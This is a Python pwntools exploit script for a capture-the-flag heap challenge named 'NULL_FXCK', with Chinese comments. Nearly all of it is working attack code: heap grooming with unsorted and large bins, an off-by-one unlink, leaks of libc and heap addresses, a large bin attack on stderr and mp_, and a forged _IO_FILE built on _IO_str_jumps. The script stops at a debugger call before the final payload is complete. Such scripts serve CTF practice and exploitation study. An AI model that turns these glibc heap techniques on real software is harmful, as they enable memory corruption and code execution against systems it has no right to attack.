# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './NULL_FXCK'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(size , Content = '\x00'):
    cmd(1)
    sla('Size: ' , size)
    sa('Content:' , Content)

def edit(idx , Content):
    cmd(2)
    sla('Index: ' , idx)
    sla('Content:' , Content)

def delete(idx ):
    cmd(3)
    sla('Index: ' , idx)

def show(idx ):
    cmd(4)
    sla('Index: ' , idx)

def pack_file(_flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = 0,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = 0,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _lock = 0,
    _wide_data = 0,
    _mode = 0):
    file_struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno)
    file_struct = file_struct.ljust(0x88, '\x00')
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, '\x00')
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, '\x00')
    return file_struct

# one_gad = one_gadget(libc.path)
# 本质是通过 unsorted bin 或者 large bin 的指针残留构造 unlink 的指针指向

add(0x418)
add(0x108)
add(0x418)
add(0x438) #3
add(0x208) #4
add(0x428) #5
add(0x418) #6

delete(0)
delete(3)
delete(5)

delete(2)

# unsorted bin 合并 ，但合并不会清空数据，某处有残留的堆地址

add(0x438, 'a' * 0x418 +  p64( 0x420 + 0x210 + 0x430 + 0x420 + 0x20 + 1)) #0

# 0xa91 写到了原来 chunk3 的 size 处，刚好这下面有残留的堆地址
# 切割已经合并的大块
# unsorted bin 从新到旧排序

add(0x418) #2
add(0x428) #3
add(0x418) #5

# 下面构造 fack fd 
delete(5)
delete(2)
add(0x418 , 'a'*9) #2
add(0x418) #5

# 下面构造 fack bk

delete(5)
delete(3)

add(0x9f8) #3
add(0x428 , 'a') #5
add(0x418) #7

# 下面进行 unlink
add(0x408, p64(0) + p64(0x411)) #8
edit(6, 'a' * 0x410 + p64(0x210 +0x430 + 0x420 + 0x420 + 0x20 ))
delete(3)

add(0x438 , flat(0 , 0 ,0 , 0x421)) #3
add(0x1600) #9

show(4)
__malloc_hook = l64() - 1644 - 0x40 - 4
libc.address = __malloc_hook - libc.sym['__malloc_hook']
_environ = libc.sym['_environ']
mp_ = libc.address + 0x1e3280
_IO_list_all = libc.sym['_IO_list_all']
_IO_str_jumps = libc.address + 0x1e5580
stderr_addr = libc.sym['stderr']

show(5)
heap_base = u64(p.recv(6).ljust( 8 , '\x00')) - 0x2b0

ptr_list = 0x4160
lg('__malloc_hook' , __malloc_hook)
lg('heap_base',heap_base)

# ptr_list = $rebase(0x000000000004160)

add(0x1458 , flat('\x00'*0x208 , 0x431 , '\x00'*0x428 , 0x421 , '\x00'*0x418 , 0xa01) )

delete(4)
delete(5)

add(0x1458  )
add(0x448)

delete(4)
add(0x1458 , flat('\x00'*0x208 , 0x431 , __malloc_hook + 0x460,__malloc_hook + 0x460 , 0 , stderr_addr - 0x20 ) )

delete(2)
add(0x448)

add(0x418)

delete(4)
add(0x1458 , flat('\x00'*0x208 , 0x431 , __malloc_hook + 0x460,__malloc_hook + 0x460 , 0 , mp_ + 80 - 0x20 ) )

delete(11)

# dbg()

add(0x448) # copy
add(0x418) # 12


size = 0x1450
old_blen = (size - 100) // 2


fake_IO_FILE = pack_file(
    _IO_write_base = 1,
    _IO_write_ptr = 0xffffffffffff,
    _IO_buf_base = heap_base + 0x4470,
    _IO_buf_end = heap_base + 0x4470 + old_blen,
) + p64(_IO_str_jumps )


dbg()




p.interactive()

'''
@File    :   NULL_FXCK.py
@Time    :   2021/09/26 13:47:40
@Author  :   Niyah
'''